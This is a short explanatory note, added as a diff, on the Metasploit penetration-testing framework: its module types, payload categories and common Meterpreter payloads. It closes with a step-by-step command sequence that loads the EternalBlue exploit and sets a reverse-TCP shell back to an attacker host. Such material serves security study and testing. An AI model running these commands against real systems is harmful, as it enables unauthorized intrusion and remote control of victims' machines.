@@ -1,0 +1,78 @@
+What is Metasploit Framework?
+
+Metasploit is an open-source penetration testing framework that provides:
+
+Exploits → Pre-built code for exploiting specific vulnerabilities.
+
+Payloads → Malicious code delivered after exploitation (reverse shell, Meterpreter, etc.).
+
+Auxiliary modules → Scanners, fuzzers, and enumeration tools.
+
+Post-exploitation modules → Tools to maintain access and gather info after exploitation.
+
+🔹 Types of Payloads in Metasploit
+
+Metasploit supports multi-payloads depending on the target and situation:
+
+1. Singles
+
+Self-contained payloads that perform one action.
+
+Example: Add a user, execute a command.
+
+2. Stagers
+
+Small pieces of code that set up a connection between attacker and victim.
+
+Used to load larger payloads.
+
+Example: windows/meterpreter/reverse_tcp (creates a TCP connection back).
+
+3. Stages
+
+Larger payloads delivered by the stager.
+
+Example: Meterpreter, VNC inject, shell.
+
+🔹 Common Metasploit Payloads
+
+windows/meterpreter/reverse_tcp → Reverse shell with full Meterpreter features.
+
+windows/meterpreter/bind_tcp → Opens a listening port on the victim machine.
+
+linux/x86/meterpreter/reverse_tcp → Linux Meterpreter shell.
+
+android/meterpreter/reverse_tcp → Remote access payload for Android.
+
+php/meterpreter/reverse_tcp → Payload for exploiting PHP apps.
+
+🔹 Example Usage
+
+Start Metasploit:
+
+msfconsole
+
+
+Search for exploit:
+
+search ms17_010
+
+
+Use exploit:
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+
+Set target & payload:
+
+set payload windows/meterpreter/reverse_tcp
+set LHOST your_ip
+set LPORT 4444
+
+
+Exploit:
+
+exploit
+
+
+⚡ Metasploit is powerful because you can switch payloads (multi-payload) depending on the target — Windows, Linux, Android, macOS, PHP, etc.
